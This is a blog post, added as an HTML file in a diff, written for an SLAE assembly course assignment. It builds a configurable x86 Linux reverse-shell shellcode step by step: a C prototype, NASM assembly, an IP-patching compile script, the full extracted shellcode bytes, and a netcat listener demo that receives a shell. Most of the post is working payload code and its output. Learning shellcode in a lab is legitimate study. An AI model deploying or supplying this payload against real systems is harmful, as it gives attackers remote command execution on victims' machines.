@@ -1,0 +1,456 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>SLAE Assignment 2 &#8211; rtmcx</title>
+<meta name="description" content="SLAE Assignment 2 - Reverse shell">
+<meta name="keywords" content="asm, code, slae">
+
+
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SLAE Assignment 2">
+<meta property="og:description" content="SLAE Assignment 2 - Reverse shell">
+<meta property="og:url" content="https://rtmcx.github.io/SLAE-Assignment-2/">
+<meta property="og:site_name" content="rtmcx">
+
+
+
+
+
+<link rel="canonical" href="https://rtmcx.github.io/SLAE-Assignment-2/">
+<link href="https://rtmcx.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="rtmcx Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://rtmcx.github.io/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="https://rtmcx.github.io/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="https://rtmcx.github.io/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="https://rtmcx.github.io/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://rtmcx.github.io/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://rtmcx.github.io/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://rtmcx.github.io/images/apple-touch-icon-144x144-precomposed.png">
+
+
+
+</head>
+
+<body id="post" class="feature">
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="https://rtmcx.github.io/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="https://rtmcx.github.io/images/CatEye.jpg" alt="rtmcx photo" class="author-photo">
+					<h4>rtmcx</h4>
+					<p>Pentester. OSCP. Aspiring shellcoder and malware analyst</p>
+				</li>
+				<li><a href="https://rtmcx.github.io/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="mailto:rtmcx@protonmail.com"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				
+				
+				
+				
+				
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="https://rtmcx.github.io/posts/">All Posts</a></li>
+				<li><a href="https://rtmcx.github.io/tags/">All Tags</a></li>
+			</ul>
+		</li>
+		
+	    
+	    <li><a href="http://www.twitter.com/rtmcx" target="_blank">Twitter</a></li>
+	  
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+
+
+
+<div class="entry-header">
+  
+  <div class="entry-image">
+    <img src="https://rtmcx.github.io/images/assignment-1.jpg" alt="SLAE Assignment 2">
+  </div><!-- /.entry-image -->
+</div><!-- /.entry-header -->
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <header class="header-title">
+      <div class="header-title-wrap">
+        
+          <h1 class="entry-title"><a href="https://rtmcx.github.io/SLAE-Assignment-2/" rel="bookmark" title="SLAE Assignment 2">SLAE Assignment 2</a></h1>
+        
+        <h2><span class="entry-date date published"><time datetime="2017-03-28T00:00:00+00:00">March 28, 2017</time></span></h2>
+        
+        <p class="entry-reading-time">
+          <i class="fa fa-clock-o"></i>
+          
+Reading time ~5 minutes
+        </p><!-- /.entry-reading-time -->
+        
+      </div><!-- /.header-title-wrap -->
+    </header>
+    <div class="entry-content">
+      <h2 id="requirements">Requirements</h2>
+
+<ul>
+  <li>Create a reverse shell shellcode
+    <ul>
+      <li>Connects to a IP and port</li>
+      <li>Execs Shell when connected</li>
+    </ul>
+  </li>
+  <li>IP and Port number should be easily conﬁgurable</li>
+</ul>
+
+<p>To better understand the task ahead and which components that are needed, I wrote a small program in C.</p>
+
+<div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+</span>
+<span class="cp">#define REMOTEPORT 1337
+#define REMOTEIP "127.0.0.1"
+</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="c1">// Address information for server and client
+</span>	<span class="c1">// sockaddr_in is found in 'netinet/in.h'
+</span>	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">client_addr</span><span class="p">;</span> 
+	
+	<span class="c1">// Set up the values for the connecting socket	
+</span>	<span class="n">client_addr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>			
+	<span class="n">client_addr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">REMOTEPORT</span><span class="p">);</span>
+	<span class="n">client_addr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">REMOTEIP</span><span class="p">);</span> 
+	
+	<span class="c1">// Create a TCP socket, stream and protocol IP.
+</span>	<span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_IP</span><span class="p">);</span>	
+
+	<span class="c1">// Connect to 'client'
+</span>	<span class="kt">int</span> <span class="n">sin_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_addr</span><span class="p">);</span>	
+	<span class="n">connect</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">client_addr</span><span class="p">,</span> <span class="n">sin_size</span><span class="p">);</span>
+	
+	<span class="c1">// Duplicate the socket to stdin, stdout, stderr
+</span>	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+		<span class="n">dup2</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
+	<span class="p">}</span>
+	
+	<span class="c1">// And run the shell
+</span>	<span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>	
+<span class="p">}</span>
+
+</code></pre>
+</div>
+<p>So the steps needed are:</p>
+
+<ol>
+  <li>Create a socket</li>
+  <li>Connect to a IP and port</li>
+  <li>Copy socket desdriptor to stdio, stdout, stderr</li>
+  <li>Execute execve</li>
+</ol>
+
+<p>So the first function to invoke is the connect()-function.</p>
+
+<p>As in the previous assignment, all the socket handling is done by the syscall “socketcall”, which has syscall number 102 (or 0x66).</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
+<span class="c">#define __NR_socketcall 102</span>
+<span class="c">#define __NR_socket 359</span>
+<span class="c">#define __NR_socketpair 360</span>
+</code></pre>
+</div>
+
+<p>We find the function numbers in the “net” header file:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot <span class="nv">$ </span>cat /usr/include/linux/net.h | grep <span class="s1">'sys_socket(2)'</span> -A5
+<span class="c">#define SYS_SOCKET  1       /* sys_socket(2)        */</span>
+<span class="c">#define SYS_BIND    2       /* sys_bind(2)          */</span>
+<span class="c">#define SYS_CONNECT 3       /* sys_connect(2)       */</span>
+<span class="c">#define SYS_LISTEN  4       /* sys_listen(2)        */</span>
+<span class="c">#define SYS_ACCEPT  5       /* sys_accept(2)        */</span>
+
+</code></pre>
+</div>
+
+<h3 id="socket">Socket</h3>
+<p>So the first task is to create the socket needed. 
+We set up the registers and execute the syscall to get a socket descriptor returned in eax. We need to save this for later use.</p>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; SOCKET    </span>
+    <span class="k">push</span> <span class="mh">0x66</span>       <span class="c">; Syscall for socketcall</span>
+    <span class="k">pop</span> <span class="n">eax</span>         <span class="c">; put syscall number in eax</span>
+
+    <span class="k">push</span> <span class="mh">0x1</span>        <span class="c">; Socketcall-number for "socket"</span>
+    <span class="k">pop</span> <span class="n">ebx</span>         <span class="c">; Put in ebx</span>
+        
+    <span class="c">; Set up the args for socket</span>
+    <span class="c">; cat /usr/include/linux/in.h </span>
+    <span class="c">; PUSH protocol, type and domain</span>
+    <span class="c">; Protocol: TCP=0, Type: SOCK_STREAM = 1, Domain: INET = 2</span>
+    <span class="k">xor</span> <span class="n">edi</span><span class="p">,</span> <span class="n">edi</span>    <span class="c">; Make edi null</span>
+    <span class="k">push</span> <span class="n">edi</span>        <span class="c">; This is 'Protocol' TCP = 0</span>
+    <span class="k">push</span> <span class="n">ebx</span>        <span class="c">; ebx already has 1 in it, reuse for Type</span>
+    <span class="k">push</span> <span class="n">byte</span> <span class="mh">0x02</span><span class="c">; Inet = 2.</span>
+    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put 'pointer' to args in ecx (args to socketcall)</span>
+    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; execute syscall. </span>
+
+    <span class="c">; Now we have a socketfd in eax</span>
+    <span class="k">xchg</span> <span class="n">esi</span><span class="p">,</span> <span class="n">eax</span>   <span class="c">; Save socketfd in esi (as we need it later on)</span>
+
+</code></pre>
+</div>
+
+<h3 id="connect">Connect</h3>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; CONNECT</span>
+    <span class="c">; Set up args for 'Connect'</span>
+    <span class="c">;   connect(int sockfd, const struct sockaddr *addr, int addrlen);</span>
+    
+    <span class="c">; ebx = socketfd (esi)</span>
+    <span class="c">; ecx = args for bind (struct sockaddr) </span>
+    <span class="c">; edx length of the args</span>
+    
+    <span class="c">; Setup the sockaddr, push the values to the stack</span>
+    <span class="c">; sockaddr (2, 9999, 0)</span>
+    <span class="c">; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2</span>
+        <span class="k">push</span> <span class="mh">0x0101017f</span> <span class="c">; 127.0.0.1</span>
+        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x3905</span><span class="c">; Port 9999 in hex network byte order (0x0f27)</span>
+        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x02</span>  <span class="c">; (AF_INET)</span>
+        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to args in ecx, for use with "bind" call  </span>
+    
+    <span class="k">push</span> <span class="mh">0x10</span>       <span class="c">; Size of the sockaddr struct (16 bytes)</span>
+    <span class="k">push</span> <span class="n">ecx</span>        <span class="c">; Argv for bind</span>
+    <span class="k">push</span> <span class="n">esi</span>        <span class="c">; esi has the socketfd in it</span>
+    <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to 'Bind'-args in ecx</span>
+    
+    <span class="k">add</span> <span class="n">bl</span><span class="p">,</span> <span class="mi">2</span>          <span class="c">; inc ebx to 3, for 'Coonect'-socketcall number</span>
+    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; zero out eax </span>
+    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span>    <span class="c">; syscall for socketcall</span>
+    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
+
+</code></pre>
+</div>
+
+<h3 id="dup2">dup2</h3>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">; to dup2 i/o-to client socketfd</span>
+    <span class="c">; dup2(oldfd, newfd)</span>
+
+    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esi</span>    <span class="c">; put client socketfd (returned in eax) to ebx</span>
+    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; make eax zero</span>
+
+    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Zero out ecx</span>
+    <span class="k">mov</span> <span class="n">cl</span><span class="p">,</span> <span class="mh">0x03</span>    <span class="c">; Start value for counter</span>
+<span class="n">dup2</span><span class="o">:</span>
+    <span class="k">dec</span> <span class="n">ecx</span>         <span class="c">; decrese ecx</span>
+    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x3f</span>    <span class="c">; syscall for dup2</span>
+    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall</span>
+    <span class="k">jnz</span> <span class="n">dup2</span>        <span class="c">; If ecx i not zero, next iteration</span>
+
+</code></pre>
+</div>
+
+<h3 id="execve">execve</h3>
+
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>
+<span class="c">; EXECVE</span>
+    <span class="c">; Setup execve</span>
+    <span class="c">; execve ("/bin/sh", NULL, NULL)</span>
+    <span class="k">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>    <span class="c">; Zero eax</span>
+    <span class="k">push</span> <span class="n">eax</span>        <span class="c">; push 0 used as a terminator</span>
+    <span class="k">push</span> <span class="mh">0x68732f6e</span> <span class="c">; hs/n in hex</span>
+    <span class="k">push</span> <span class="mh">0x69622f2f</span> <span class="c">; ib//  in hex</span>
+
+    <span class="c">; Set up ebx for syscall     </span>
+    <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put address to //bin/sh0x0 in ebx     </span>
+    <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>    <span class="c">; Put a zero in ecx     </span>
+    <span class="k">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span>    <span class="c">; Put a zero in edx     </span>
+    <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0xb</span>     <span class="c">; Syscall for execve     </span>
+    <span class="k">int</span> <span class="mh">0x80</span>        <span class="c">; Execute syscall </span>
+</code></pre>
+</div>
+
+<h2 id="replace-ip-address">Replace IP address</h2>
+
+<p>Since one requirement is to be able to configure the IP address, I updated the compiler-script to replace the IP at compile time:</p>
+
+<div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="nv">ipmarker</span><span class="o">=</span><span class="s2">"</span><span class="se">\\\x</span><span class="s2">bb</span><span class="se">\\\x</span><span class="s2">bb</span><span class="se">\\\x</span><span class="s2">bb</span><span class="se">\\\x</span><span class="s2">bb"</span>
+<span class="k">if</span> <span class="o">[[</span> <span class="nv">$shellcode</span> <span class="o">==</span> <span class="k">*</span><span class="nv">$ipmarker</span><span class="k">*</span> <span class="o">]]</span> ; <span class="k">then</span>
+        <span class="c"># Yes, shellcode contains ip marker bytes       </span>
+
+        <span class="nv">ipbytes</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span> <span class="nv">$ip</span> | tr <span class="s2">"."</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="k">)</span>
+
+        <span class="nv">iphexbytes</span><span class="o">=</span><span class="s2">""</span>
+        <span class="k">for </span>byte <span class="k">in</span> <span class="nv">$ipbytes</span>
+        <span class="k">do
+                </span><span class="nv">iphexbyte</span><span class="o">=</span><span class="k">$(</span><span class="nb">printf</span> <span class="s2">"%02x"</span> <span class="nv">$byte</span><span class="k">)</span>
+                <span class="nv">iphexbytes</span><span class="o">=</span><span class="nv">$iphexbytes</span><span class="s2">"</span><span class="se">\\</span><span class="s2">x</span><span class="nv">$iphexbyte</span><span class="s2">"</span>
+        <span class="k">done
+
+        </span><span class="nb">echo</span> <span class="s2">"[***] Replacing the ip to </span><span class="nv">$ip</span><span class="s2"> (</span><span class="nv">$iphexbytes</span><span class="s2">)"</span>
+        <span class="nv">shellcode</span><span class="o">=</span><span class="s2">"</span><span class="k">${</span><span class="nv">shellcode</span><span class="p">/</span><span class="nv">$ipmarker</span><span class="p">/</span><span class="nv">$iphexbytes</span><span class="k">}</span><span class="s2">"</span>
+<span class="k">fi</span>
+</code></pre>
+</div>
+<p>Of course, we need to change the IP and port assignment in the source code (done under ‘connect’):</p>
+<div class="language-nasm highlighter-rouge"><pre class="highlight"><code>  <span class="c">; ADDR_FAMILY = 0, PORT = 9999, AF_INET = 2</span>
+        <span class="k">push</span> <span class="mh">0xbbbbbbbb</span> <span class="c">; Marker bytes for replaceing the IP</span>
+        <span class="k">push</span> <span class="n">word</span> <span class="mh">0xaaaa</span><span class="c">; Marker bytes for replaceing the port</span>
+        <span class="k">push</span> <span class="n">word</span> <span class="mh">0x02</span>  <span class="c">; (AF_INET)</span>
+        <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>    <span class="c">; Put pointer to args in ecx, for use with "bind" call </span>
+</code></pre>
+</div>
+
+<p>Execute the script, providing the IP and port (first we get our IP):</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ ifconfig eth0 | grep eth0 -A2
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.56.101 netmask 255.255.255.0  broadcast 10.0.2.255
+      
+rtmcx@parrot $ compile.sh 192.168.56.101 4455
+[***] Compiling with nasm...
+[***] Linking with ld...
+
+[***] Replacing the ip to 192.168.56.101 (\xc0\xa8\x38\x65)
+[***] Replacing the port to 4455 (\x11\x67)
+
+[***] Extracted shellcode:
+\x6a\x66\x58\x6a\x01\x5b\x31\xff\x57\x53\x6a\x02\x89\xe1\xcd\x80\x96\x68\xc0\xa8\x38\x65\x66\x68\x11\x67\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\x80\xc3\x02\x31\xc0\xb0\x66\xcd\x80\x89\xf3\x31\xc0\x31\xc9\xb1\x03\x49\xb0\x3f\xcd\x80\x75\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
+Shellcode length: 84
+</code></pre>
+</div>
+<p>We can now setup a netcat listener and execute out shellcode to get it to connect ‘back to us’.</p>
+
+<p>Start the listener:</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ nc -lvp 4455
+listening on [any] 4455 ...
+</code></pre>
+</div>
+
+<p>Execute the shellcode-wrapper (in another terminal):</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ ./shellcode-reverse-shell 
+Shellcode length: 84
+</code></pre>
+</div>
+
+<p>We get the connection in the listener terminal…</p>
+<div class="highlighter-rouge"><pre class="highlight"><code>rtmcx@parrot $ nc -lvp 4455
+listening on [any] 4455 ...
+192.168.56.101: inverse host lookup failed: Unknown host
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.101] 57786
+
+ls
+reverse-shell
+reverse-shell.nasm
+reverse-shell.o
+shellcode-reverse-shell
+shellcode-reverse-shell.c
+</code></pre>
+</div>
+<p>Assignment done!</p>
+
+<p>All code and scripts can be found in the repository: <a href="https://github.com/rtmcx/SLAE">https://github.com/rtmcx/SLAE</a>.</p>
+
+<hr />
+
+<p>This blog post has been created for completing the requirements of the <a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">SecurityTube Linux Assembly Expert certification</a>.</p>
+
+<p>Student ID: PA-0726</p>
+
+      <footer class="entry-meta">
+        <span class="entry-tags"><a href="https://rtmcx.github.io/tags/#asm" title="Pages tagged asm" class="tag"><span class="term">asm</span></a><a href="https://rtmcx.github.io/tags/#code" title="Pages tagged code" class="tag"><span class="term">code</span></a><a href="https://rtmcx.github.io/tags/#slae" title="Pages tagged slae" class="tag"><span class="term">slae</span></a></span>
+        <span>Updated on <span class="entry-date date updated"><time datetime="2017-03-28 19:38:15 +0000">March 28, 2017</time></span></span>
+        <span class="author vcard"><span class="fn">rtmcx</span></span>
+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://rtmcx.github.io/SLAE-Assignment-2/" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://rtmcx.github.io/SLAE-Assignment-2/" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=https://rtmcx.github.io/SLAE-Assignment-2/" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    <div class="read-more">
+  
+    <div class="read-more-header">
+      <a href="https://rtmcx.github.io/SLAE-Assignment-1/" class="read-more-btn">Read More</a>
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      <h3><a href="https://rtmcx.github.io/SLAE-Assignment-7/" title="SLAE Assignment 7">SLAE Assignment 7</a></h3>
+      <p>SLAE Assignment 7 - Custom crypter <a href="https://rtmcx.github.io/SLAE-Assignment-7/">Continue reading</a></p>
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+    
+      <div class="list-item">
+        <h4><a href="https://rtmcx.github.io/SLAE-Assignment-6/" title="SLAE Assignment 6">SLAE Assignment 6</a></h4>
+        <span>Published on May 09, 2017</span>
+      </div><!-- /.list-item -->
+    
+      <div class="list-item">
+        <h4><a href="https://rtmcx.github.io/SLAE-Assignment-5_3/" title="SLAE Assignment 5 (3/3)">SLAE Assignment 5 (3/3)</a></h4>
+        <span>Published on May 06, 2017</span>
+      </div><!-- /.list-item -->
+    
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2017 rtmcx. Powered by <a href="http://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://mademistakes.com/work/hpstr-jekyll-theme/" rel="nofollow">HPSTR Theme</a>.</span>
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="https://rtmcx.github.io/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="https://rtmcx.github.io/assets/js/scripts.min.js"></script>
+
+
+
+	        
+
+</body>
+</html>
